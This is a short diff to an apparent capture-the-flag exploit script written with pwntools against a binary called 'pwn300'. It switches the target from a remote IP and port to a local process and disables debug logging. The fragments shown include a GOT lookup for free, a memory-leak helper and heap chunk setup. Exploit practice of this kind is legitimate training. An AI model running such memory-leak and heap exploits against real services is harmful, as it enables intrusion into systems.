@@ -1,6 +1,6 @@
 from pwn import *
 
-context(log_level="debug")
+# context(log_level="debug")
 buf = 0x08049D80
 elf = ELF('pwn300')
 free = elf.got['free']
@@ -35,8 +35,8 @@ def leak(addr):
 	data = show(1)[0:4]
 	print "%#x => %s" % (addr, (data or '').encode('hex'))
 	return data
-#p = process('./pwn300')
-p = remote('58.213.63.30',61112)
+p = process('./pwn300')
+# p = remote('58.213.63.30',61112)
 ## we should create some chunck
 
 setchunk(0x80)
